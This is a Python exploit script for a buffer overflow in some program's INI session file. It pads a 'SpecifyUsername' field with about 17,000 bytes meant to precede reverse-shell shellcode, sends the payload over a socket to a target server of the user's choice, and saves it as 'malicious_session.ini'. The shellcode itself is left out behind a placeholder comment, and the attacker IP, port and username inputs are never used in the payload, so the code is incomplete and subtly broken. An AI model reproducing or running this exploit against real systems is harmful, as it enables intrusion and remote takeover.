#!/usr/bin/env python

import socket
import sys

def generate_payload(ip, port, username):
    # Linux x86 shellcode template (reverse shell)
    shellcode = (
        # ... (same shellcode as before)
    )
    return "[Bookmarks]\nSpecifyUsername=" + "A"*17000 + "B"*4 + "C"*4 + "D"*4 + shellcode

def send_payload(payload, target_ip, target_port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            s.sendall(payload.encode())
            print(f"Payload sent to {target_ip}:{target_port}")
    except Exception as e:
        print(f"Error sending payload: {str(e)}")

def main():
    ip = input("Enter attacker's IP address: ").strip()
    port = input("Enter attacker's port (default: 443): ").strip() or "443"
    username = input("Enter SpecifyUsername value (default: 'hacked'): ").strip() or "hacked"
    
    payload = generate_payload(ip, port, username)
    
    # Display payload details before sending
    print("\nGenerated payload details:")
    print(f"Target username: {username}")
    print(f"Attacker IP: {ip}")
    print(f"Attacker port: {port}")
    print(f"Payload length: {len(payload)} bytes")
    print("\nPayload preview:")
    print(payload[:100] + "...")  # Show first 100 characters
    
    # Prompt to send payload
    send_choice = input("\nSend payload to server? (y/n): ").lower()
    if send_choice == "y":
        target_ip = input("Enter target server IP: ").strip()
        target_port = int(input("Enter target server port: ").strip())
        send_payload(payload, target_ip, target_port)
    
    # Save to file (optional)
    save = input("Save to file? (y/n): ").lower() == "y"
    if save:
        with open("malicious_session.ini", "w") as f:
            f.write(payload)
        print("Payload saved to malicious_session.ini")

if __name__ == "__main__":
    main()
